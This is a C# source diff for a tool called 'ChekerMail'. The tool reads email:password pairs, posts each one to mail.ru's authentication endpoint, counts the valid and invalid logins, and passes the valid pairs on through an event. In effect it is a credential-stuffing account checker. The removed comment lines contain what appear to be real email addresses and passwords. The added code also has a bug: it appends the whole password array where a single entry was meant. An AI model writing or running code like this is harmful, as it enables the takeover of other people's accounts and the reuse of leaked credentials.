@@ -1,13 +1,17 @@
 ﻿using System;
-using System.Collections.Generic;
 using System.Linq;
-using System.Text;
-using System.Threading.Tasks;
 using xNet;
 namespace ChekerMail
 {
-    class Accounts
+    sealed class Accounts
     {
+        public event Action <String> result;
+        public event Action<Int32, Int32, Int32, Int32> G_B_inP_P;
+        private Int32 _procesed = 0;
+        private Int32 _inProcessed;
+        private Int32 _g =0;
+        private Int32 _b =0;
+
         private string[] _mail;
         private string[] _pass;
         public Accounts(string[] acc)
@@ -34,17 +38,17 @@ namespace ChekerMail
                 }
                 _mail[i] = val[0];
                 _pass[i] = val[1];
-            }
+            } 
             val = null;
         }
         public String AddLabelProcess() => _mail.Length.ToString();
-        //public String GoodAcc() {return  }
-
+        
 
         public void Start()
         {
             using (var request = new HttpRequest())
             {
+                _inProcessed = _mail.Length;
                 for (int i = 0; i < _mail.Length; i++)
                 {
                     request.Cookies = new CookieDictionary();
@@ -59,14 +63,24 @@ namespace ChekerMail
                     string responce = request.Post("https://auth.mail.ru/cgi-bin/auth", urlParams, true).ToString();
                     if (responce != null)
                     {
-                        if (responce.Contains("window-loading")) ;
-                        if (!responce.Contains("window-loading")) ;
+                        if (responce.Contains("window-loading")) 
+                        {
+                            _g++;
+                            _inProcessed--;
+                            _procesed++;
+                            G_B_inP_P?.Invoke(_g, _b, _inProcessed, _procesed);
+                            string res = _mail[i] + "::" + _pass;
+                            result?.Invoke(res);
+                        }
+                        if (!responce.Contains("window-loading")) 
+                        {
+                            _b++;
+                            _inProcessed--;
+                            _procesed++;
+                            G_B_inP_P?.Invoke(_g, _b, _inProcessed, _procesed);
+                        }
                     }
                 }
-                //blf_blf_blf3@mail.ru
-                //zefn1hbnvfy34
-                //nana110-97@mail.ru
-                //karina5-
             }
         }
     }
